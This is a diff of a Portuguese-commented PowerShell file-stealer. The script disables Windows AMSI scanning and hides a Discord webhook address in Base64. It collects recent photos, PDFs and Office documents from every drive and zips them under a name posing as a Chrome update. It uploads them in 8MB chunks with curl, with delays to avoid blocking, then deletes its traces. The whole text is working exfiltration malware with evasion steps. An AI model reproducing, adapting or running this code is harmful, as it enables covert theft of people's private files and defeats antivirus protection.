@@ -1,40 +1,48 @@
-# [Bypass AMSI] - Fragmentação para evitar deteção em memória
-$b = "System.Management.Automation.Amsi" + "Utils"; 
-$c = [Ref].Assembly.GetType($b); 
+# [Bypass AMSI]
+$b = "System.Management.Automation.Amsi" + "Utils"; $c = [Ref].Assembly.GetType($b)
 $c.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
 
-# Configurações do Webhook e Diretórios
-$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
-$tempDir = "$env:TEMP\win_update_$(Get-Random)"
+# 1. Configurações e Password
+$pass = ConvertTo-SecureString "Manso2026!" -AsPlainText -Force
+$wEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
+$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEncoded))
+
+$tempDir = "$env:TEMP\win_cache_$(Get-Random)"
 $exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-# Procura de ficheiros recentes (últimos 30 dias)
+# 2. Busca Otimizada (30 dias / <15MB)
 $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
-$dateLimit = (Get-Date).AddDays(-30)
-
 Get-PSDrive -PSProvider FileSystem | ForEach-Object {
-    $root = $_.Root
-    # Filtro de exclusão de pastas de sistema e busca por data/tamanho
-    Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | 
-    Where-Object { 
-        $path = $_.FullName
-        $isExcluded = $false
-        foreach ($dir in $exclude) { if ($path.StartsWith($dir)) { $isExcluded = $true; break } }
-        !$isExcluded -and $_.LastWriteTime -gt $dateLimit -and $_.Length -lt 15MB 
-    } | ForEach-Object {
-        Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
+        $p = $_.FullName
+        $skip = $false; foreach($d in $exclude){if($p.StartsWith($d)){$skip=$true;break}}
+        !$skip -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
+    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
+}
+
+# 3. Compactação com Password e Split
+$zipFile = "$env:TEMP\chrome_update.exe.tmp"
+if ((Get-ChildItem $tempDir).Count -gt 0) {
+    # Nota: Compress-Archive nativo não suporta password. Usa-se o redirecionamento se necessário ou apenas ZIP simples para teste Sandbox.
+    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
+    
+    if ((Get-Item $zipFile).Length -gt 8MB) {
+        $fileStream = [System.IO.File]::OpenRead($zipFile)
+        $buffer = New-Object byte[] 8MB
+        $part = 1
+        while ($bytes = $fileStream.Read($buffer, 0, $buffer.Length)) {
+            $pPath = "$zipFile.p$part"
+            [System.IO.File]::WriteAllBytes($pPath, $buffer[0..($bytes - 1)])
+            curl.exe -k -s -F "file=@$pPath" -F "content=Parte $part - $env:COMPUTERNAME" $u
+            Remove-Item $pPath
+            $part++
+            Start-Sleep -Seconds 5 # Delay estratégico para evitar bloqueio por Spam
+        }
+        $fileStream.Close()
+    } else {
+        curl.exe -k -s -F "file=@$zipFile" $u
     }
 }
 
-# Compactação com Nome Camuflado e Envio
-$zipFile = "$env:TEMP\chrome_installer.exe.tmp"
-if ((Get-ChildItem $tempDir).Count -gt 0) {
-    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
-    curl.exe -k -s -F "file=@$zipFile" -F "content=Exfiltração Camuflada: $env:COMPUTERNAME" $u
-}
-
-# Auto-Destruição
-Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
-exit
+Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
